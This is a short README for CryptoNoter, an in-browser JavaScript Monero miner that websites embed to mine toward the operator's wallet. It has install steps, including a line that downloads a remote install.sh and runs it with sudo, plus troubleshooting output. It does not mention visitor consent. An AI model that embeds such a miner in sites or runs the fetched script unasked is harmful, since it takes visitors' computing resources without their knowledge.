## CryptoNoter v1.2
In-Browser Javascript XMR miner for websites / Payout towards personal XMR wallet<br />
Built for in-browser javascript mining on any Monero pools. 0% Commission. 100% Payout

## Installation
```bash
Install Nginx
sudo apt-get update
sudo apt-get install nginx
```

Install NodeJs & NPM
```bash
sudo apt-get update
sudo apt-get install nodejs
sudo apt-get install npm
```

Install CryptoNoter
```bash
curl https://raw.githubusercontent.com/cryptonoter/CryptoNoter/master/install.sh > install.sh
sudo sh install.sh
```

## Troubleshooting
Check if server.js execute successfully by using this command
```bash
node /srv/CryptoNoter/server.js
```
If script executes successfully, it should show:
```bash
In-Browser Javascript XMR miner for websites / Payout towards personal XMR wallet
Built for in-browser javascript mining on any Monero pools. 0% Commission. 100% Payout

 Listen on : 127.0.0.1:7777
 Pool Host : monero.us.to:1111
 Ur Wallet : YOUR_WALLET_ADDRESS
```
If script executes unsucessfully, it should show error logs. Troubleshoot by referring to the errors shown.
For Example: The error log shown below means that the port 7777 is currently in use. To resolve, simply listen to the port 7777, identify the process that is using the port and kill the process. Then try executing the script server.js again
```bash
Error: listen EADDRINUSE 127.0.0.1:7777
    at Object._errnoException (util.js:1024:11)
    at _exceptionWithHostPort (util.js:1046:20)
    at Server.setupListenHandle [as _listen2] (net.js:1351:14)
    at listenInCluster (net.js:1392:12)
    at doListen (net.js:1501:7)
    at _combinedTickCallback (internal/process/next_tick.js:141:11)
    at process._tickCallback (internal/process/next_tick.js:180:9)
    at Function.Module.runMain (module.js:678:11)
    at startup (bootstrap_node.js:187:16)
    at bootstrap_node.js:608:3
```

